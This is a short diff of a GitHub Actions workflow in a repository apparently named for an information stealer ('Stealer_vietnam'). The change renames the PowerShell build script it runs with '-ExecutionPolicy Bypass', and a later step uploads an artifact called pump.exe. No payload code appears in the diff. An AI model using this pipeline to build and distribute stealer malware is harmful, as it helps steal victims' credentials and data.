@@ -17,7 +17,7 @@ jobs:
         run: |
           $ErrorActionPreference = 'Stop'
           $workdir = "D:\a\Stealer_vietnam\Stealer_vietnam"
-          & powershell -ExecutionPolicy Bypass -File "$workdir\tootls\pump\buildcode.dontcare"
+          & powershell -ExecutionPolicy Bypass -File "$workdir\tootls\pump\buildcode.ps1"
 
       - name: Upload pump.exe
         uses: actions/upload-artifact@v3
